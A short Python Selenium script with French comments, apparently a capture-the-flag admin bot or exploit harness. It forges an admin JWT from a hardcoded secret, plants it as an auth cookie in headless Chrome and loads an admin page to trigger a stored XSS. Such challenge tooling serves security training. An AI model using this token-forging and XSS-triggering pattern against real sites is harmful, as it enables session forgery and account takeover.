import time, json, base64, hmac, hashlib
from selenium import webdriver
from selenium.webdriver.chrome.options import Options

# --- CONFIGURATION ---
URL = "http://prankex.io/admin_tickets"
SECRET = "TheD0ll3xVauItKey_PR4NK3X"
PAYLOAD = {"sub": "admin", "role": "dev", "is_dev": True}

# --- GÉNÉRATION JWT ---
def create_jwt(payload, secret):
    def b64(data): return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    
    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload.update({"iat": int(time.time()), "exp": int(time.time()) + 3600})
    body = b64(json.dumps(payload).encode())
    
    sig = hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
    return f"{header}.{body}.{b64(sig)}"

token = create_jwt(PAYLOAD, SECRET)

# --- SELENIUM ---
options = Options()
options.add_argument("--headless=new") # 'new' est plus stable
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")

driver = webdriver.Chrome(options=options)
driver.set_page_load_timeout(10) # Évite le blocage infini

try:
    # 1. Initialiser le domaine pour le cookie
    driver.get("http://prankex.io/") 
    driver.add_cookie({'name': 'auth', 'value': token, 'path': '/'})
    
    # 2. Charger la page cible (déclenche la XSS)
    print(f"Chargement de {URL}...")
    driver.get(URL)
    
    # 3. Laisser un court instant pour l'exécution du JS
    time.sleep(1) 
    print(f"Page chargée. Titre : {driver.title}")

except Exception as e:
    print(f"Erreur : {e}")

finally:
    driver.quit()
    print("Navigateur fermé.")